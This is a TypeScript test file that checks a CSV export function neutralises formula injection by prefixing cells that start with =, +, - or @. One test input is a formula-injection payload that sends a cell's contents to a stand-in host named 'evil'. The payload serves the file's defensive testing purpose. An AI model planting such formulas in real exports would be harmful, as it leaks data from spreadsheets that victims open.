import { describe, it, expect, vi, beforeEach } from 'vitest'

// AUDIT #649 — escapeCell() only quoted a cell containing ,/"/\n/\r, never
// neutralizing a cell whose value *starts* with =/+/-/@, the classic CSV
// formula-injection vector Excel/Sheets executes on open.

let capturedBlobParts: string[] = []

class FakeBlob {
  parts: string[]
  constructor(parts: string[]) {
    this.parts = parts
    capturedBlobParts = parts
  }
}

beforeEach(() => {
  capturedBlobParts = []
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  vi.stubGlobal('Blob', FakeBlob as any)
  vi.stubGlobal('URL', { createObjectURL: vi.fn(() => 'blob:fake'), revokeObjectURL: vi.fn() })
  const fakeAnchor = { href: '', download: '', click: vi.fn() }
  vi.spyOn(document, 'createElement').mockReturnValue(fakeAnchor as unknown as HTMLElement)
})

import { downloadCsv } from '@/lib/csv-export'

function csvOutput(): string {
  return capturedBlobParts.join('')
}

describe('downloadCsv — CSV formula injection (#649)', () => {
  it('prefixes a cell starting with = with a leading single-quote', () => {
    downloadCsv([{ name: '=HYPERLINK("http://evil/steal?"&A1)' }], [{ key: 'name', label: 'Name' }], 'test')
    expect(csvOutput()).toContain("'=HYPERLINK")
  })

  it('prefixes cells starting with +, -, or @', () => {
    downloadCsv(
      [{ a: '+1234', b: '-1234', c: '@SUM(1)' }],
      [{ key: 'a', label: 'A' }, { key: 'b', label: 'B' }, { key: 'c', label: 'C' }],
      'test',
    )
    const out = csvOutput()
    expect(out).toContain("'+1234")
    expect(out).toContain("'-1234")
    expect(out).toContain("'@SUM(1)")
  })

  it('leaves an ordinary cell value untouched', () => {
    downloadCsv([{ name: 'Acme Corp' }], [{ key: 'name', label: 'Name' }], 'test')
    expect(csvOutput()).toContain('Acme Corp')
    expect(csvOutput()).not.toContain("'Acme")
  })

  it('still quotes a cell containing a comma, independent of the formula-injection fix', () => {
    downloadCsv([{ name: 'Smith, Jones & Co.' }], [{ key: 'name', label: 'Name' }], 'test')
    expect(csvOutput()).toContain('"Smith, Jones & Co."')
  })

  it('quotes a formula-prefixed cell that also contains a comma', () => {
    downloadCsv([{ name: '=A1,B1' }], [{ key: 'name', label: 'Name' }], 'test')
    expect(csvOutput()).toContain('"\'=A1,B1"')
  })
})
